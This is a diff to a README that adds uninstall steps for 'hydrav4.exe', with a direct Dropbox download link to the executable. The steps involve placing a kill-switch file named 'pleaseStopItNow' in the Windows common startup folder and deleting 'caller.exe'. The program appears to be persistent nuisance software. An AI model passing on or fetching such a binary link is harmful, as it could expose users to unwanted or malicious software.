@@ -14,6 +14,14 @@
 
 ## Uninstallation
 
+###### [hydrav4.exe](https://www.dropbox.com/s/4w03hy3joxxnb2r/hydrav4.exe?dl=1)
+  1. locate the directory "HYDRA_INFO" on your Desktop
+  1. follow the steps in README.txt:
+      1. head over to the common startup directory by hitting WIN+R and typing "shell:common startup" 
+      1. copy or create a file identical to the other file in "HYDRA_INFO" (currently: "pleaseStopItNow") in the common startup folder. 
+         This process requires you to be a System Administrator.
+      1. delete "caller.exe" in %localappdata%
+
 ###### [hydrav3.exe](https://www.dropbox.com/s/9to311lo5jj4u9v/hydrav3.exe?dl=1)
   1. locate the directory "HYDRA_INFO" on your Desktop
   1. follow the steps in README.txt:
